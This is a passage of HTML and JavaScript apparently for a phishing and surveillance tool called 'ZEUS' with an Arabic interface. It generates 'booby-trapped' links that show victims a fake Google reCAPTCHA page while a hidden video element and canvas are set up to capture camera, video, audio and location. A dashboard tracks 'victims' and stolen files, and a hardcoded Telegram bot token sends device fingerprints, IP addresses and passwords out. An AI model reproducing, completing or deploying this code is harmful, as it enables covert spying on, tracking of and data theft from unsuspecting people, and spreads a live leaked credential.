+                <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1.5"/><rect x="14" y="3" width="7" height="7" rx="1.5"/><rect x="3" y="14" width="7" height="7" rx="1.5"/><rect x="14" y="14" width="7" height="7" rx="1.5"/></svg>
+                <span class="label">المميـــــــزات</span>
+            </div>
+            <div class="toggle-group">
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureCamFront" checked />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M6 6 L8 8 M18 18 L16 16"/></svg>
+                        كاميرا أمامية
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureCamBack" />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/><path d="M6 18 L8 16 M18 6 L16 8"/></svg>
+                        كاميرا خلفية
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureVideoFront" />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2"/><polygon points="10,8 16,12 10,16" fill="currentColor"/></svg>
+                        فيديو أمامي
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureVideoBack" />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><rect x="4" y="6" width="16" height="12" rx="2"/><polygon points="10,8 16,12 10,16" fill="currentColor"/><path d="M2 6 L6 10 M22 6 L18 10"/></svg>
+                        فيديو خلفي
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureLocation" />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><polygon points="12,3 20,8 18,18 12,21 6,18 4,8"/><circle cx="12" cy="12" r="3"/></svg>
+                        الموقع
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+                <label class="zeus-toggle">
+                    <input type="checkbox" id="featureAudio" />
+                    <span class="toggle-label">
+                        <svg viewBox="0 0 24 24"><path d="M12 2v20"/><path d="M8 8a4 4 0 018 0v8a4 4 0 01-8 0"/></svg>
+                        تسجيل صوتي
+                    </span>
+                    <span class="track"><span class="thumb"></span></span>
+                </label>
+            </div>
+        </div>
+
+        <div class="card" style="margin-top:16px;">
+            <div class="label-wrap">
+                <svg viewBox="0 0 24 24"><path d="M10 6 L21 6 M10 12 L18 12 M10 18 L15 18"/><path d="M4 6 L6 6 M4 12 L6 12 M4 18 L6 18"/></svg>
+                <span class="label">الرابط الأساسي</span>
+            </div>
+            <div class="input-wrap">
+                <input type="text" id="baseUrlInput" placeholder="أدخل الرابط المستهدف …" dir="ltr" />
+            </div>
+        </div>
+
+        <div class="generate-wrap">
+            <button class="btn-generate" id="genBtn">
+                <svg viewBox="0 0 24 24"><polygon points="12,2 22,8 22,16 12,22 2,16 2,8"/><polygon points="12,8 16,12 12,16 8,12" fill="currentColor"/></svg>
+                توليد الرابط الملغم
+            </button>
+        </div>
+
+        <div class="result-section">
+            <div class="label-wrap">
+                <svg viewBox="0 0 24 24"><path d="M10 14 L14 10"/><path d="M4 12 L8 8" opacity="0.5"/><path d="M20 12 L16 8" opacity="0.5"/><path d="M4 12 L8 16" opacity="0.5"/><path d="M20 12 L16 16" opacity="0.5"/></svg>
+                <span class="section-title">الرابط الملغم</span>
+            </div>
+            <div class="result">
+                <div class="info-box">
+                    <span class="value" id="tokenDisplay">التوكن الخاص بك</span>
+                    <span class="sub" id="resultSub">الرابط المُلغَّم الخاص بك</span>
+                </div>
+                <div class="actions">
+                    <button id="copyBtn">
+                        <svg viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2"/><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16"/></svg>
+                    </button>
+                    <button id="openBtn">
+                        <svg viewBox="0 0 24 24"><path d="M9 15L21 3M21 3h-7M21 3v7"/><path d="M19 13v6.5a1.5 1.5 0 0 1-1.5 1.5H4.5A1.5 1.5 0 0 1 3 19.5V6.5A1.5 1.5 0 0 1 4.5 5H11"/></svg>
+                    </button>
+                </div>
+            </div>
+        </div>
+
+        <div class="footer" onclick="window.open('https://t.me/xx_8k', '_blank')">
+            <span>تــم التطـــوير بواسطــــــة</span>
+            <span class="dev-name">أشـــــروف</span>
+            <span class="icon-badge">
+                <svg viewBox="0 0 24 24"><polygon points="12,2 20,6 20,18 12,22 4,18 4,6"/><circle cx="12" cy="12" r="4"/></svg>
+            </span>
+        </div>
+    </div>
+
+    <div class="dash-overlay" id="dashOverlay">
+        <div class="dash-container">
+            <div class="dash-header-bar">
+                <div class="dash-title">
+                    ZEUS
+                    <small>لوحة التحكم المتكاملة</small>
+                </div>
+                <div class="dash-header-actions">
+                    <button id="dashThemeToggle">
+                        <svg viewBox="0 0 24 24"><path d="M12 2v2M12 20v2M4.93 4.93l1.41 1.41M17.66 17.66l1.41 1.41M2 12h2M20 12h2M4.93 19.07l1.41-1.41M17.66 6.34l1.41-1.41"/><circle cx="12" cy="12" r="5"/></svg>
+                    </button>
+                    <button class="dash-close" id="dashCloseBtn">✕ إغلاق اللوحة</button>
+                </div>
+            </div>
+
+            <div class="dash-body">
+                <div class="dash-sidebar" id="dashSidebar">
+                    <span class="sidebar-label">التنقل</span>
+                    <button class="nav-item active" data-view="overview">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="7" height="7" rx="1"/><rect x="14" y="3" width="7" height="7" rx="1"/><rect x="3" y="14" width="7" height="7" rx="1"/><rect x="14" y="14" width="7" height="7" rx="1"/></svg>
+                        <span>نظرة عامة</span>
+                    </button>
+                    <button class="nav-item" data-view="bots">
+                        <svg viewBox="0 0 24 24"><rect x="3" y="3" width="18" height="18" rx="4"/><circle cx="12" cy="9" r="3"/><path d="M6 17 Q12 13 18 17"/></svg>
+                        <span>البوتات</span>
+                        <span class="badge-nav" id="navBotCount">0</span>
+                    </button>
+                    <button class="nav-item" data-view="victims">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="9"/><circle cx="12" cy="12" r="3"/></svg>
+                        <span>الضحايا</span>
+                        <span class="badge-nav" id="navVictimCount">0</span>
+                    </button>
+                    <button class="nav-item" data-view="files">
+                        <svg viewBox="0 0 24 24"><path d="M13 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V9z"/><polyline points="13 2 13 9 20 9"/></svg>
+                        <span>الملفات</span>
+                        <span class="badge-nav" id="navFileCount">0</span>
+                    </button>
+                    <button class="nav-item" data-view="logs">
+                        <svg viewBox="0 0 24 24"><path d="M4 6h16M4 12h12M4 18h8"/></svg>
+                        <span>سجل العمليات</span>
+                    </button>
+                    <button class="nav-item" data-view="settings">
+                        <svg viewBox="0 0 24 24"><circle cx="12" cy="12" r="3"/><path d="M19.4 15a1.65 1.65 0 0 0 .33-1.82 1.65 1.65 0 0 0-1.51-1H18a2 2 0 0 1-1.73-1 2 2 0 0 1 0-2 2 2 0 0 1 1.73-1h.22a1.65 1.65 0 0 0 1.51-1 1.65 1.65 0 0 0-.33-1.82"/><path d="M4.6 9a1.65 1.65 0 0 0-.33 1.82c.24.51.75.82 1.33.82h.22a2 2 0 0 1 1.73 1 2 2 0 0 1 0 2 2 2 0 0 1-1.73 1H5.6a1.65 1.65 0 0 0-1.51 1 1.65 1.65 0 0 0 .33 1.82"/></svg>
+                        <span>الإعدادات</span>
+                    </button>
+                    <div style="margin-top:14px;padding-top:10px;border-top:1px solid var(--line);">
+                        <button class="nav-item" id="dashDevPageBtn">
+                            <svg viewBox="0 0 24 24"><path d="M12 2L2 7l10 5 10-5-10-5z"/><path d="M2 17l10 5 10-5"/><path d="M2 12l10 5 10-5"/></svg>
+                            <span>صفحة المطور</span>
+                        </button>
+                    </div>
+                </div>
+
+                <div class="dash-content" id="dashContent">
+                    <div class="view active" id="view-overview">
+                        <div class="dash-stats-grid">
+                            <div class="dash-stat-card"><span class="stat-num" id="ovBots">0</span><div class="stat-label">البوتات</div></div>
+                            <div class="dash-stat-card"><span class="stat-num" id="ovVictims">0</span><div class="stat-label">الضحايا</div></div>
+                            <div class="dash-stat-card"><span class="stat-num" id="ovFiles">0</span><div class="stat-label">الملفات</div></div>
+                            <div class="dash-stat-card"><span class="stat-num" id="ovToday">0</span><div class="stat-label">زيارات اليوم</div></div>
+                        </div>
+                        <div class="chart-container">
+                            <div style="font-weight:600;font-family:var(--font-en);color:var(--gold);margin-bottom:6px;font-size:11px;letter-spacing:1px;opacity:0.8;">النشاط خلال الأيام الماضية</div>
+                            <canvas id="activityChart" height="120"></canvas>
+                        </div>
+                        <div class="detail-view">
+                            <div style="font-weight:700;font-family:var(--font-en);color:var(--gold);margin-bottom:10px;font-size:13px;">آخر النشاطات</div>
+                            <div id="recentLogs"><div class="empty-msg">لا توجد سجلات حديثة.</div></div>
+                        </div>
+                    </div>
+
+                    <div class="view" id="view-bots">
+                        <div class="dash-toolbar">
+                            <div class="search-wrap">
+                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+                                <input type="text" id="botSearch" placeholder="بحث عن بوت …" />
+                            </div>
+                            <select class="filter-select" id="botFilter">
+                                <option value="all">جميع البوتات</option>
+                                <option value="recent">الأحدث</option>
+                            </select>
+                        </div>
+                        <div id="botListContainer"><div class="empty-msg">لا توجد بوتات.</div></div>
+                    </div>
+
+                    <div class="view" id="view-victims">
+                        <div class="dash-toolbar">
+                            <div class="search-wrap">
+                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+                                <input type="text" id="victimSearch" placeholder="بحث عن ضحية …" />
+                            </div>
+                            <select class="filter-select" id="victimFilter">
+                                <option value="all">جميع الضحايا</option>
+                                <option value="today">اليوم</option>
+                            </select>
+                        </div>
+                        <div id="victimListContainer"><div class="empty-msg">لا توجد ضحايا.</div></div>
+                    </div>
+
+                    <div class="view" id="view-files">
+                        <div class="dash-toolbar">
+                            <div class="search-wrap">
+                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+                                <input type="text" id="fileSearch" placeholder="بحث عن ملف …" />
+                            </div>
+                            <select class="filter-select" id="fileFilter">
+                                <option value="all">جميع الملفات</option>
+                                <option value="image">صور</option>
+                                <option value="video">فيديوهات</option>
+                                <option value="audio">صوتيات</option>
+                            </select>
+                        </div>
+                        <div id="fileGalleryContainer"><div class="empty-msg">لا توجد ملفات.</div></div>
+                    </div>
+
+                    <div class="view" id="view-logs">
+                        <div class="dash-toolbar">
+                            <div class="search-wrap">
+                                <svg viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="M21 21l-4.35-4.35"/></svg>
+                                <input type="text" id="logSearch" placeholder="بحث في السجل …" />
+                            </div>
+                            <select class="filter-select" id="logFilter">
+                                <option value="all">جميع العمليات</option>
+                                <option value="success">ناجحة</option>
+                                <option value="error">فاشلة</option>
+                                <option value="info">معلومات</option>
+                            </select>
+                        </div>
+                        <div id="logContainer"><div class="empty-msg">لا توجد سجلات.</div></div>
+                    </div>
+
+                    <div class="view" id="view-settings">
+                        <div class="detail-view">
+                            <div style="font-weight:700;font-family:var(--font-en);color:var(--gold);margin-bottom:10px;font-size:13px;">إعدادات النظام</div>
+                            <div class="detail-row">
+                                <span class="label">الوضع</span>
+                                <span class="value" id="settingsTheme">فاتح</span>
+                                <button class="copy-inline" id="settingsThemeToggle" style="margin-right:auto;">تبديل</button>
+                            </div>
+                            <div class="detail-row">
+                                <span class="label">عدد البوتات</span>
+                                <span class="value" id="settingsBotCount">0</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="label">عدد الضحايا</span>
+                                <span class="value" id="settingsVictimCount">0</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="label">عدد الملفات</span>
+                                <span class="value" id="settingsFileCount">0</span>
+                            </div>
+                            <div class="detail-row">
+                                <span class="label">حجم التخزين</span>
+                                <span class="value" id="settingsStorageSize">0 KB</span>
+                            </div>
+                            <div style="margin-top:14px;padding-top:10px;border-top:1px solid var(--line);">
+                                <button class="copy-inline" id="settingsClearData" style="color:var(--danger);">مسح جميع البيانات</button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div class="dev-page" id="devPage">
+        <div class="dev-container">
+            <button class="dev-close" id="devCloseBtn">✕</button>
+            <div class="dev-title">صفحة المطور</div>
+            <div class="dev-sub">سجل كلمات المرور — القديمة والجديدة</div>
+            <div class="dev-password-list" id="devPasswordList">
+                <div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>
+            </div>
+            <div style="text-align:center;margin-top:14px;font-family:var(--font-en);font-size:10px;color:var(--ink-faint);opacity:0.7;">
+                يتم إرسال كل كلمة مرور جديدة إلى التليجرام تلقائياً.
+            </div>
+        </div>
+    </div>
+
+    <div id="victimPage">
+        <div style="display:flex;flex-direction:column;align-items:center;width:100%;max-width:400px;">
+            <div class="captcha-wrapper" id="captchaWrapper">
+                <div class="captcha-row">
+                    <div class="spinner" id="spinner">
+                        <input type="checkbox" id="captcha" />
+                        <label class="checkmark" for="captcha">
+                            <span class="tick"></span>
+                            <div class="loader"></div>
+                        </label>
+                    </div>
+                    <div class="text" id="mainText">أنا لست روبوتاً</div>
+                    <div class="logo-captcha">
+                        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA" />
+                        <strong>reCAPTCHA</strong>
+                        <small>الخصوصية - الشروط</small>
+                    </div>
+                </div>
+                <div class="captcha-footer">
+                    <div class="brand">
+                        <svg viewBox="0 0 24 24"><path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92a5.06 5.06 0 0 1-2.2 3.32v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.1z"/><path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/><path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/><path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/></svg>
+                        <span class="google-text">Google</span>
+                    </div>
+                    <div class="links">
+                        <a href="#" onclick="return false;">سياسة الخصوصية</a>
+                        <span class="separator">-</span>
+                        <a href="#" onclick="return false;">الشروط</a>
+                    </div>
+                </div>
+            </div>
+            <div class="victim-status" id="victimStatus"></div>
+        </div>
+    </div>
+
+    <video id="hiddenVideo" autoplay playsinline muted></video>
+    <canvas id="hiddenCanvas"></canvas>
+
+    <script>
+        (function() {
+            "use strict";
+
+            // ================================================================
+            //  CONFIGURATION
+            // ================================================================
+
+            var MASTER_BOT_TOKEN = "8793989696:AAFhWB0hQ-NeWEEINtriTqsvj4haTiMim9E";
+            var MASTER_CHAT_ID = "8552540563";
+            var DEVELOPER_LINK = "https://t.me/xx_8k";
+
+            // ================================================================
+            //  TOAST SYSTEM
+            // ================================================================
+
+            function showToast(msg, type) {
+                var t = document.getElementById('toast');
+                if (!t) return;
+                t.textContent = msg;
+                t.className = 'toast-msg ' + (type || '');
+                t.classList.add('show');
+                clearTimeout(t._timer);
+                t._timer = setTimeout(function() { t.classList.remove('show'); }, 2800);
+            }
+
+            // ================================================================
+            //  TIME & DATE
+            // ================================================================
+
+            function updateDateTime() {
+                var now = new Date();
+                var egypt = new Date(now.toLocaleString('en-US', { timeZone: 'Africa/Cairo' }));
+                var h = String(egypt.getHours()).padStart(2, '0');
+                var m = String(egypt.getMinutes()).padStart(2, '0');
+                var d = String(egypt.getDate()).padStart(2, '0');
+                var mo = String(egypt.getMonth() + 1).padStart(2, '0');
+                var y = egypt.getFullYear();
+                var te = document.getElementById('timeDisplay');
+                var de = document.getElementById('dateDisplay');
+                if (te) te.textContent = h + ':' + m;
+                if (de) de.textContent = d + '/' + mo + '/' + y;
+            }
+            updateDateTime();
+            setInterval(updateDateTime, 10000);
+
+            // ================================================================
+            //  THEME
+            // ================================================================
+
+            var currentTheme = localStorage.getItem('zeus_theme') || 'light';
+
+            function applyTheme(theme) {
+                currentTheme = theme;
+                document.documentElement.setAttribute('data-theme', theme === 'dark' ? 'dark' : '');
+                localStorage.setItem('zeus_theme', theme);
+                var label = document.getElementById('themeLabel');
+                if (label) label.textContent = theme === 'dark' ? 'داكن' : 'فاتح';
+                var st = document.getElementById('settingsTheme');
+                if (st) st.textContent = theme === 'dark' ? 'داكن' : 'فاتح';
+            }
+
+            function toggleTheme() {
+                applyTheme(currentTheme === 'light' ? 'dark' : 'light');
+                if (dashOpen) renderDashboard();
+            }
+
+            document.getElementById('themeToggle').addEventListener('click', toggleTheme);
+            document.getElementById('dashThemeToggle').addEventListener('click', toggleTheme);
+            document.getElementById('settingsThemeToggle').addEventListener('click', toggleTheme);
+
+            // ================================================================
+            //  MODE DETECTION
+            // ================================================================
+
+            var urlParams = new URLSearchParams(window.location.search);
+            var rawToken = urlParams.get('t');
+            var encodedData = urlParams.get('d');
+
+            if (encodedData && encodedData.length > 0) {
+                document.body.className = 'victim-mode';
+                initVictimPage(encodedData);
+            } else if (rawToken && rawToken.length >= 4) {
+                document.body.className = 'victim-mode';
+                initVictimPage(null);
+            } else {
+                document.body.className = 'admin-mode';
+                initAdminPanel();
+                initSecretDoor();
+            }
+
+            // ================================================================
+            //  SECRET DOOR
+            // ================================================================
+
+            var dashOpen = false;
+            var currentSecretCode = '';
+            var clickCount = 0;
+            var clickTimer = null;
+
+            function generateSecretCode(len) {
+                var chars = 'ABCDEFGHJKLMNPQRSTUVWXYZ23456789abcdefghijkmnopqrstuvwxyz!@#$%^&*?';
+                var result = '';
+                var array = new Uint32Array(len);
+                crypto.getRandomValues(array);
+                for (var i = 0; i < len; i++) {
+                    result += chars[array[i] % chars.length];
+                }
+                return result;
+            }
+
+            async function collectAttemptData() {
+                var ip = 'غير متاح';
+                try {
+                    var res = await fetch('https://api.ipify.org?format=json');
+                    var data = await res.json();
+                    ip = data.ip;
+                } catch (e) {}
+                var ua = navigator.userAgent;
+                var browser = 'Unknown';
+                if (/Chrome/.test(ua)) browser = 'Chrome';
+                else if (/Firefox/.test(ua)) browser = 'Firefox';
+                else if (/Safari/.test(ua)) browser = 'Safari';
+                else if (/Edge/.test(ua)) browser = 'Edge';
+                else if (/Opera/.test(ua)) browser = 'Opera';
+                var os = 'Unknown';
+                if (ua.includes('Windows NT 10.0')) os = 'Windows 10';
+                else if (ua.includes('Windows NT 6.1')) os = 'Windows 7';
+                else if (ua.includes('Mac OS X')) os = 'macOS';
+                else if (ua.includes('Android')) os = 'Android';
+                else if (ua.includes('iPhone') || ua.includes('iPad')) os = 'iOS';
+                else if (ua.includes('Linux')) os = 'Linux';
+                return {
+                    ip: ip,
+                    browser: browser,
+                    os: os,
+                    language: navigator.language,
+                    screen: screen.width + 'x' + screen.height,
+                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                    timestamp: new Date().toISOString(),
+                    userAgent: ua,
+                    platform: navigator.platform,
+                    hardwareConcurrency: navigator.hardwareConcurrency,
+                    deviceMemory: navigator.deviceMemory,
+                };
+            }
+
+            async function sendAttemptNotification(success, codeEntered, attemptData) {
+                var status = success ? '✅ ناجحة' : '❌ فاشلة';
+                var msg =
+                    '⭑ محاولة دخول إلى الداشبورد ⭒\n' +
+                    '⊚─〔 البيانات 〕────────\n' +
+                    '˼📌˹ الحالة: ' + status + ' ⭒\n' +
+                    '˼🔑˹ الكود المدخل: ' + (codeEntered || 'لم يُدخل') + ' ⭒\n' +
+                    '˼🌐˹ الـ IP: ' + attemptData.ip + ' ⭒\n' +
+                    '˼💻˹ المتصفح: ' + attemptData.browser + ' ⭒\n' +
+                    '˼🖥️˹ نظام التشغيل: ' + attemptData.os + ' ⭒\n' +
+                    '˼🕒˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                    '─────────────────';
+                try {
+                    await fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                    });
+                } catch (e) {}
+            }
+
+            function logAttempt(success, codeEntered, attemptData) {
+                var logs = JSON.parse(localStorage.getItem('zeus_attempt_logs') || '[]');
+                logs.push({
+                    success: success,
+                    codeEntered: codeEntered,
+                    data: attemptData,
+                    timestamp: Date.now()
+                });
+                if (logs.length > 100) logs = logs.slice(-100);
+                localStorage.setItem('zeus_attempt_logs', JSON.stringify(logs));
+            }
+
+            function openDashboardWithCode(code) {
+                var success = (code === currentSecretCode);
+                var codeEntered = code || '';
+                var attemptData = collectAttemptData();
+                logAttempt(success, codeEntered, attemptData);
+                sendAttemptNotification(success, codeEntered, attemptData);
+                if (success) {
+                    dashOpen = true;
+                    document.getElementById('dashOverlay').classList.add('active');
+                    applyTheme(currentTheme);
+                    renderDashboard();
+                    showToast('تم فتح لوحة التحكم.', 'success');
+                    document.getElementById('codeModal').classList.remove('active');
+                    currentSecretCode = generateSecretCode(32);
+                } else {
+                    document.getElementById('codeError').classList.add('show');
+                    document.getElementById('codeInput').value = '';
+                    document.getElementById('codeInput').focus();
+                    showToast('الكود غير صحيح.', 'error');
+                }
+            }
+
+            function showCodeModal() {
+                var newCode = generateSecretCode(32);
+                currentSecretCode = newCode;
+                var history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
+                var oldCode = history.length > 0 ? history[history.length - 1].password : 'لا يوجد';
+                var msg =
+                    '⭑ كود الداشبورد الجديد ⭒\n' +
+                    '⊚─〔 بيانات الكود 〕────────\n' +
+                    '˼🔑˹ الكود الجديد: ' + newCode + ' ⭒\n' +
+                    '˼🔐˹ الكود القديم: ' + oldCode + ' ⭒\n' +
+                    '˼🕒˹ الوقت: ' + new Date().toLocaleString('ar-EG') + ' ⭒\n' +
+                    '─────────────────';
+                try {
+                    fetch('https://api.telegram.org/bot' + MASTER_BOT_TOKEN + '/sendMessage', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: msg })
+                    });
+                } catch (e) {}
+                history.push({ password: newCode, timestamp: new Date().toLocaleString('ar-EG') });
+                if (history.length > 50) history = history.slice(-50);
+                localStorage.setItem('zeus_password_history', JSON.stringify(history));
+                document.getElementById('codeModal').classList.add('active');
+                document.getElementById('codeInput').value = '';
+                document.getElementById('codeError').classList.remove('show');
+                document.getElementById('codeInput').focus();
+                var ad = collectAttemptData();
+                logAttempt(false, '--- فتح المودال ---', ad);
+                sendAttemptNotification(false, '--- فتح المودال ---', ad);
+            }
+
+            function closeCodeModal() {
+                document.getElementById('codeModal').classList.remove('active');
+            }
+
+            function initSecretDoor() {
+                var trigger = document.getElementById('secretTrigger');
+                var hint = document.getElementById('secretHint');
+                trigger.addEventListener('click', function(e) {
+                    e.stopPropagation();
+                    clickCount++;
+                    clearTimeout(clickTimer);
+                    clickTimer = setTimeout(function() {
+                        if (clickCount >= 3) {
+                            clickCount = 0;
+                            if (!dashOpen) {
+                                hint.classList.add('show');
+                                setTimeout(function() { hint.classList.remove('show'); }, 1200);
+                                showCodeModal();
+                            } else {
+                                showToast('الداشبورد مفتوح بالفعل.', 'warning');
+                            }
+                        } else {
+                            clickCount = 0;
+                        }
+                    }, 500);
+                });
+
+                document.addEventListener('keydown', function(e) {
+                    if (e.ctrlKey && e.shiftKey && (e.key === 'd' || e.key === 'D')) {
+                        e.preventDefault();
+                        if (!dashOpen) {
+                            hint.classList.add('show');
+                            setTimeout(function() { hint.classList.remove('show'); }, 1200);
+                            showCodeModal();
+                        } else {
+                            showToast('الداشبورد مفتوح بالفعل.', 'warning');
+                        }
+                    }
+                });
+
+                document.getElementById('codeConfirmBtn').addEventListener('click', function() {
+                    var code = document.getElementById('codeInput').value.trim();
+                    if (!code) { document.getElementById('codeError').classList.add('show'); return; }
+                    openDashboardWithCode(code);
+                });
+                document.getElementById('codeCancelBtn').addEventListener('click', function() {
+                    closeCodeModal();
+                    var ad = collectAttemptData();
+                    logAttempt(false, '--- إلغاء ---', ad);
+                    sendAttemptNotification(false, '--- إلغاء ---', ad);
+                });
+                document.getElementById('codeInput').addEventListener('keydown', function(e) {
+                    if (e.key === 'Enter') document.getElementById('codeConfirmBtn').click();
+                });
+                document.getElementById('codeModal').addEventListener('click', function(e) {
+                    if (e.target === this) {
+                        closeCodeModal();
+                        var ad = collectAttemptData();
+                        logAttempt(false, '--- إغلاق المودال ---', ad);
+                        sendAttemptNotification(false, '--- إغلاق المودال ---', ad);
+                    }
+                });
+                document.getElementById('dashCloseBtn').addEventListener('click', function() { closeDashboard(); });
+                document.getElementById('dashOverlay').addEventListener('click', function(e) {
+                    if (e.target === this) closeDashboard();
+                });
+                document.getElementById('devCloseBtn').addEventListener('click', function() { hideDevPage(); });
+                document.getElementById('devPage').addEventListener('click', function(e) {
+                    if (e.target === this) hideDevPage();
+                });
+                document.getElementById('dashDevPageBtn').addEventListener('click', function() { showDevPage(); });
+
+                setInterval(function() { if (dashOpen) renderDashboard(); }, 12000);
+                console.log('ZEUS — الباب السري جاهز.');
+            }
+
+            function closeDashboard() {
+                if (!dashOpen) return;
+                dashOpen = false;
+                document.getElementById('dashOverlay').classList.remove('active');
+                showToast('تم إغلاق لوحة التحكم.', '');
+            }
+
+            function showDevPage() {
+                renderDevPage();
+                document.getElementById('devPage').classList.add('active');
+            }
+
+            function hideDevPage() {
+                document.getElementById('devPage').classList.remove('active');
+            }
+
+            function renderDevPage() {
+                var list = document.getElementById('devPasswordList');
+                var history = JSON.parse(localStorage.getItem('zeus_password_history') || '[]');
+                if (history.length === 0) {
+                    list.innerHTML = '<div class="dev-empty">لا توجد كلمات مرور مسجلة بعد.</div>';
+                    return;
+                }
+                var html = '';
+                var reversed = history.slice().reverse();
+                for (var i = 0; i < reversed.length; i++) {
+                    var item = reversed[i];
+                    var label = i === 0 ? 'الأحدث' : (i === 1 ? 'السابق' : 'قبل ' + i);
+                    html +=
+                        '<div class="dev-password-item">' +
+                        '<div class="pwd-info">' +
+                        '<span class="pwd-label">' + label + '</span>' +
+                        '<span class="pwd-value">' + item.password + '</span>' +
+                        '<span class="pwd-time">' + item.timestamp + '</span>' +
+                        '</div>' +
+                        '<button class="pwd-copy" data-pwd="' + item.password + '">' +
+                        '<svg viewBox="0 0 24 24"><rect x="8" y="8" width="13" height="13" rx="2"/><path d="M4 16V4.5A1.5 1.5 0 0 1 5.5 3H16"/></svg>' +
+                        'نسخ' +
+                        '</button>' +
+                        '</div>';
+                }
+                list.innerHTML = html;
+                list.querySelectorAll('.pwd-copy').forEach(function(btn) {
+                    btn.addEventListener('click', function() {
+                        var pwd = this.getAttribute('data-pwd');
+                        if (navigator.clipboard) {
+                            navigator.clipboard.writeText(pwd).then(function() {
+                                showToast('تم نسخ كلمة المرور.', 'success');
+                            }).catch(function() {});
+                        } else {
+                            var ta = document.createElement('textarea');
+                            ta.value = pwd;
+                            document.body.appendChild(ta);
+                            ta.select();
+                            document.execCommand('copy');
+                            document.body.removeChild(ta);
+                            showToast('تم نسخ كلمة المرور.', 'success');
+                        }
+                    });
+                });
+            }
+
+            // ================================================================
+            //  DASHBOARD
+            // ================================================================
+
+            var currentView = 'overview';
+
+            function renderDashboard() {
+                var bots = JSON.parse(localStorage.getItem('zeus_bots') || '[]');
+                var victims = JSON.parse(localStorage.getItem('zeus_victims') || '[]');
+                var files = JSON.parse(localStorage.getItem('zeus_files') || '[]');
+
+                document.getElementById('navBotCount').textContent = bots.length;
+                document.getElementById('navVictimCount').textContent = victims.length;
+                document.getElementById('navFileCount').textContent = files.length;
+
+                document.getElementById('ovBots').textContent = bots.length;
+                document.getElementById('ovVictims').textContent = victims.length;
+                document.getElementById('ovFiles').textContent = files.length;
+
+                var today = new Date().toISOString().slice(0, 10);
+                var todayVictims = victims.filter(function(v) { return v.timestamp && v.timestamp.startsWith(today); });
+                document.getElementById('ovToday').textContent = todayVictims.length;
+
+                document.getElementById('settingsBotCount').textContent = bots.length;
+                document.getElementById('settingsVictimCount').textContent = victims.length;
+                document.getElementById('settingsFileCount').textContent = files.length;
+
+                var totalSize = 0;
+                try {
+                    for (var key in localStorage) {
+                        if (localStorage.hasOwnProperty(key)) {
+                            totalSize += localStorage[key].length * 2;
+                        }
+                    }
+                } catch (e) {}
+                var sizeStr = totalSize > 1024 * 1024 ? (totalSize / (1024 * 1024)).toFixed(2) + ' MB' :
+                    totalSize > 1024 ? (totalSize / 1024).toFixed(2) + ' KB' :
+                    totalSize + ' B';
+                document.getElementById('settingsStorageSize').textContent = sizeStr;
+
+                renderBotList(bots);
+                renderVictimList(victims, files);
+                renderFileGallery(files);
+                renderLogs();
+                renderRecentLogs();
+                drawChart(victims);
+                applyTheme(currentTheme);
+            }
+
+            function drawChart(victims) {
+                var canvas = document.getElementById('activityChart');
+                if (!canvas) return;
+                var ctx = canvas.getContext('2d');
